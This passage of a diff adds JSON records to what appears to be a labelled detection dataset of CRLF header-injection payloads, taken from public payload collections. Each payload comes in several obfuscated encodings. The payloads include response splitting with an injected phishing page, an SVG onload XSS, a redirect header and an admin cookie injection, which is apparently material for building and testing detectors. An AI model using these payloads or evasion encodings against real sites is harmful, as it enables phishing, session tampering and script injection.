+    "payload": "http://www.example.net/index.php?lang=en\\r\\nContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3c8d58a6259f0304c5f954537b1362655149691466be8898485584e2579aa340",
+    "original_id": "raw_logi_00013",
+    "original_payload": "http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "obfuscated_payload": "http://www.example.net/index.php?lang=en\\r\\nContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91965889,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00013__obf04",
+    "payload": "aHR0cDovL3d3dy5leGFtcGxlLm5ldC9pbmRleC5waHA_bGFuZz1lbiUwRCUwQUNvbnRlbnQtTGVuZ3RoJTNhJTIwMCUwQSUyMCUwYUhUVFAvMS4xJTIwMjAwJTIwT0slMGFDb250ZW50LVR5cGUlM0ElMjB0ZXh0L2h0bWwlMGFMYXN0LU1vZGlmaWVkJTNhJTIwTW9uJTJDJTIwMjclMjBPY3QlMjAyMDYwJTIwMTQlM2E1MCUzYTE4JTIwR01UJTBhQ29udGVudC1MZW5ndGglM2ElMjAzNCUwYSUyMCUwQSUzQ2h0bWwlM2VZb3UlMjBoYXZlJTIwYmVlbiUyMFBoaXNoZWQlM0MvaHRtbCUzRQ==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3c8d58a6259f0304c5f954537b1362655149691466be8898485584e2579aa340",
+    "original_id": "raw_logi_00013",
+    "original_payload": "http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E",
+    "obfuscated_payload": "aHR0cDovL3d3dy5leGFtcGxlLm5ldC9pbmRleC5waHA_bGFuZz1lbiUwRCUwQUNvbnRlbnQtTGVuZ3RoJTNhJTIwMCUwQSUyMCUwYUhUVFAvMS4xJTIwMjAwJTIwT0slMGFDb250ZW50LVR5cGUlM0ElMjB0ZXh0L2h0bWwlMGFMYXN0LU1vZGlmaWVkJTNhJTIwTW9uJTJDJTIwMjclMjBPY3QlMjAyMDYwJTIwMTQlM2E1MCUzYTE4JTIwR01UJTBhQ29udGVudC1MZW5ndGglM2ElMjAzNCUwYSUyMCUwQSUzQ2h0bWwlM2VZb3UlMjBoYXZlJTIwYmVlbiUyMFBoaXNoZWQlM0MvaHRtbCUzRQ==",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 91966898,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00014__obf01",
+    "payload": "http%3A%2F%2Fexample.com%2F%250d%250aContent-Length%3A35%250d%250aX-XSS-Protection%3A0%250d%250a%250d%250a23%250d%250a%3Csvg%2520onload%3Dalert%28document.domain%29%3E%250d%250a0%250d%250a%2F%252f%252e%252e",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e6543c3f02ba0ea559fd4dd6bbf040a3399166403f5d99a9bf5a90f7b54d5598",
+    "original_id": "raw_logi_00014",
+    "original_payload": "http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e",
+    "obfuscated_payload": "http%3A%2F%2Fexample.com%2F%250d%250aContent-Length%3A35%250d%250aX-XSS-Protection%3A0%250d%250a%250d%250a23%250d%250a%3Csvg%2520onload%3Dalert%28document.domain%29%3E%250d%250a0%250d%250a%2F%252f%252e%252e",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92063874,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00014__obf02",
+    "payload": "aHR0cDovL2V4YW1wbGUuY29tLyUwZCUwYUNvbnRlbnQtTGVuZ3RoOjM1JTBkJTBhWC1YU1MtUHJvdGVjdGlvbjowJTBkJTBhJTBkJTBhMjMlMGQlMGE8c3ZnJTIwb25sb2FkPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik-JTBkJTBhMCUwZCUwYS8lMmYlMmUlMmU",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e6543c3f02ba0ea559fd4dd6bbf040a3399166403f5d99a9bf5a90f7b54d5598",
+    "original_id": "raw_logi_00014",
+    "original_payload": "http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e",
+    "obfuscated_payload": "aHR0cDovL2V4YW1wbGUuY29tLyUwZCUwYUNvbnRlbnQtTGVuZ3RoOjM1JTBkJTBhWC1YU1MtUHJvdGVjdGlvbjowJTBkJTBhJTBkJTBhMjMlMGQlMGE8c3ZnJTIwb25sb2FkPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik-JTBkJTBhMCUwZCUwYS8lMmYlMmUlMmU",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 92064883,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00014__obf03",
+    "payload": "http://example.com/\\r\\nContent-Length:35%0D%0aX-XSS-Protection:0%0D%0a%0d%0A23%0D%0a<svg%20onload=alert(document.domain)>%0D%0A0%0D%0A/%2F%2E%2e",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e6543c3f02ba0ea559fd4dd6bbf040a3399166403f5d99a9bf5a90f7b54d5598",
+    "original_id": "raw_logi_00014",
+    "original_payload": "http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e",
+    "obfuscated_payload": "http://example.com/\\r\\nContent-Length:35%0D%0aX-XSS-Protection:0%0D%0a%0d%0A23%0D%0a<svg%20onload=alert(document.domain)>%0D%0A0%0D%0A/%2F%2E%2e",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 92065892,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00014__obf04",
+    "payload": "h%74%74p://exampl%65.co%6D/%0D%0aCon%74ent%2DLen%67th:35%0d%%30aX-XS%53-%50rotection:0%0d%0a%0d%0a2%33%0d%%30%61<%73vg%20onload=alert(%64ocum%65n%74.dom%61in)>%0d%0a%30%0d%0a/%2%66%2e%2e",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e6543c3f02ba0ea559fd4dd6bbf040a3399166403f5d99a9bf5a90f7b54d5598",
+    "original_id": "raw_logi_00014",
+    "original_payload": "http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e",
+    "obfuscated_payload": "h%74%74p://exampl%65.co%6D/%0D%0aCon%74ent%2DLen%67th:35%0d%%30aX-XS%53-%50rotection:0%0d%0a%0d%0a2%33%0d%%30%61<%73vg%20onload=alert(%64ocum%65n%74.dom%61in)>%0d%0a%30%0d%0a/%2%66%2e%2e",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92066901,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00015__obf01",
+    "payload": "%250d%250aLocation%3A%2520http%3A%2F/myweb.com",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b386d1db01a8694e80f3f558d3e1b05197f15c648061253f1337f9089c27c8f6",
+    "original_id": "raw_logi_00015",
+    "original_payload": "%0d%0aLocation:%20http://myweb.com",
+    "obfuscated_payload": "%250d%250aLocation%3A%2520http%3A%2F/myweb.com",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92163877,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00015__obf02",
+    "payload": "JTBkJTBhTG9jYXRpb246JTIwaHR0cDovL215d2ViLmNvbQ==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b386d1db01a8694e80f3f558d3e1b05197f15c648061253f1337f9089c27c8f6",
+    "original_id": "raw_logi_00015",
+    "original_payload": "%0d%0aLocation:%20http://myweb.com",
+    "obfuscated_payload": "JTBkJTBhTG9jYXRpb246JTIwaHR0cDovL215d2ViLmNvbQ==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 92164886,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00015__obf03",
+    "payload": "\\r\\nLocation:%20http://myweb.com",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b386d1db01a8694e80f3f558d3e1b05197f15c648061253f1337f9089c27c8f6",
+    "original_id": "raw_logi_00015",
+    "original_payload": "%0d%0aLocation:%20http://myweb.com",
+    "obfuscated_payload": "\\r\\nLocation:%20http://myweb.com",
+    "obfuscation_chain": [
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 92165895,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00015__obf04",
+    "payload": "%5Cr%5CnLocation%3A%2520http%3A//myweb.com",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b386d1db01a8694e80f3f558d3e1b05197f15c648061253f1337f9089c27c8f6",
+    "original_id": "raw_logi_00015",
+    "original_payload": "%0d%0aLocation:%20http://myweb.com",
+    "obfuscated_payload": "%5Cr%5CnLocation%3A%2520http%3A//myweb.com",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92166904,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00016__obf01",
+    "payload": "value%5Cr%5CnSet-Cookie%3A%20admin%3Dtrue",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d1750eba31335d9d1d1d975e2c7f14ff728799efee670249446099ce8607c2c1",
+    "original_id": "raw_logi_00016",
+    "original_payload": "value\\r\\nSet-Cookie: admin=true",
+    "obfuscated_payload": "value%5Cr%5CnSet-Cookie%3A%20admin%3Dtrue",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92263880,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00016__obf02",
+    "payload": "dmFsdWVcclxuU2V0LUNvb2tpZTogYWRtaW49dHJ1ZQ",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d1750eba31335d9d1d1d975e2c7f14ff728799efee670249446099ce8607c2c1",
+    "original_id": "raw_logi_00016",
+    "original_payload": "value\\r\\nSet-Cookie: admin=true",
+    "obfuscated_payload": "dmFsdWVcclxuU2V0LUNvb2tpZTogYWRtaW49dHJ1ZQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 92264889,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00016__obf03",
+    "payload": "value\\u005cr\\nSet-Cookie\\u003a admin=true",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d1750eba31335d9d1d1d975e2c7f14ff728799efee670249446099ce8607c2c1",
+    "original_id": "raw_logi_00016",
+    "original_payload": "value\\r\\nSet-Cookie: admin=true",
+    "obfuscated_payload": "value\\u005cr\\nSet-Cookie\\u003a admin=true",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 92265898,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00016__obf04",
+    "payload": "value%255Cr%255CnSet-Cookie%253A%2520admin%253Dtrue",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/README.md",
+    "source_path": "CRLF Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d1750eba31335d9d1d1d975e2c7f14ff728799efee670249446099ce8607c2c1",
+    "original_id": "raw_logi_00016",
+    "original_payload": "value\\r\\nSet-Cookie: admin=true",
+    "obfuscated_payload": "value%255Cr%255CnSet-Cookie%253A%2520admin%253Dtrue",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 92266907,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00017__obf01",
+    "payload": "%250d%0a",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00017",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e4153683cc69e4b38e50a2bf7a5f44cd433b8d56d0accd5e52ae3c8b074b2c6a",
+    "original_id": "raw_logi_00017",
+    "original_payload": "%0d%0a",
+    "obfuscated_payload": "%250d%0a",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92363883,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00017__obf02",
+    "payload": "JTBkJTBh",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00017",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e4153683cc69e4b38e50a2bf7a5f44cd433b8d56d0accd5e52ae3c8b074b2c6a",
+    "original_id": "raw_logi_00017",
+    "original_payload": "%0d%0a",
+    "obfuscated_payload": "JTBkJTBh",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 92364892,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00017__obf03",
+    "payload": "\\r\\n",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00017",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e4153683cc69e4b38e50a2bf7a5f44cd433b8d56d0accd5e52ae3c8b074b2c6a",
+    "original_id": "raw_logi_00017",
+    "original_payload": "%0d%0a",
+    "obfuscated_payload": "\\r\\n",
+    "obfuscation_chain": [
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 92365901,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00017__obf04",
+    "payload": "XHJcbg==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00017",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e4153683cc69e4b38e50a2bf7a5f44cd433b8d56d0accd5e52ae3c8b074b2c6a",
+    "original_id": "raw_logi_00017",
+    "original_payload": "%0d%0a",
+    "obfuscated_payload": "XHJcbg==",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 92366910,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00018__obf01",
+    "payload": "%25250d%25250a%25250d%25250a",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00018",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "72acca58b28aa13bd27d8a4ab501178831594960bc2b6a3109f433eb247f3029",
+    "original_id": "raw_logi_00018",
+    "original_payload": "%0d%0a%0d%0a",
+    "obfuscated_payload": "%25250d%25250a%25250d%25250a",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 92463886,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00018__obf02",
+    "payload": "JTBkJTBhJTBkJTBh",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00018",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "72acca58b28aa13bd27d8a4ab501178831594960bc2b6a3109f433eb247f3029",
+    "original_id": "raw_logi_00018",
+    "original_payload": "%0d%0a%0d%0a",
+    "obfuscated_payload": "JTBkJTBhJTBkJTBh",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 92464895,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00018__obf03",
+    "payload": "%0D%0a%0D%0a",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00018",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "72acca58b28aa13bd27d8a4ab501178831594960bc2b6a3109f433eb247f3029",
+    "original_id": "raw_logi_00018",
+    "original_payload": "%0d%0a%0d%0a",
+    "obfuscated_payload": "%0D%0a%0D%0a",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92465904,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00018__obf04",
+    "payload": "%25250d%25250A%25250D%25250a",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00018",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "72acca58b28aa13bd27d8a4ab501178831594960bc2b6a3109f433eb247f3029",
+    "original_id": "raw_logi_00018",
+    "original_payload": "%0d%0a%0d%0a",
+    "obfuscated_payload": "%25250d%25250A%25250D%25250a",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 92466913,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00019__obf01",
+    "payload": "r%250d%250aContentLength%3A%25200%250d%250a%250d%250aHTTP%2F1.1%2520200%2520OK%250d%250aContentType%3A%2520text%2Fhtml%250d%250aContentLength%3A%252019%250d%250a%250d%250a%3Chtml%3EInjected%2502Content%3C%2Fhtml%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00019",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "8f38d82f8a6af81ae978e6913094997a39a2bf529a2bedff675cc847b4c60abc",
+    "original_id": "raw_logi_00019",
+    "original_payload": "r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>",
+    "obfuscated_payload": "r%250d%250aContentLength%3A%25200%250d%250a%250d%250aHTTP%2F1.1%2520200%2520OK%250d%250aContentType%3A%2520text%2Fhtml%250d%250aContentLength%3A%252019%250d%250a%250d%250a%3Chtml%3EInjected%2502Content%3C%2Fhtml%3E",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92563889,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00019__obf02",
+    "payload": "ciUwZCUwYUNvbnRlbnRMZW5ndGg6JTIwMCUwZCUwYSUwZCUwYUhUVFAvMS4xJTIwMjAwJTIwT0slMGQlMGFDb250ZW50VHlwZTolMjB0ZXh0L2h0bWwlMGQlMGFDb250ZW50TGVuZ3RoOiUyMDE5JTBkJTBhJTBkJTBhPGh0bWw-SW5qZWN0ZWQlMDJDb250ZW50PC9odG1sPg",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
